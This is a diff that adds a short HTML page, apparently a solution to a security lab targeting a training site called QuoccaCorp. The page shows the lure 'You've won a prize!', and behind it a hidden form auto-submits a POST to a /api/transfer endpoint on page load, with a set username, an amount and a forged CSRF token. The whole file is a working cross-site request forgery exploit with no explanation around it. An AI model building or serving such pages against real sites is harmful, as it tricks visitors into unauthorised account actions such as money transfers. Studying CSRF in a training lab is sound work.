@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>You've won a prize!</title>
+</head>
+<body>
+    <h1>Redirecting to your account...</h1>
+    <form id="csrf-form" method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
+        <input type="hidden" name="username" value="z5426463"> <input type="hidden" name="amount" value="1337"> <input type="hidden" name="csrf_token" value="NDgyNQ=="> </form>
+
+    <script>
+        // 當頁面載入時，自動提交表單
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
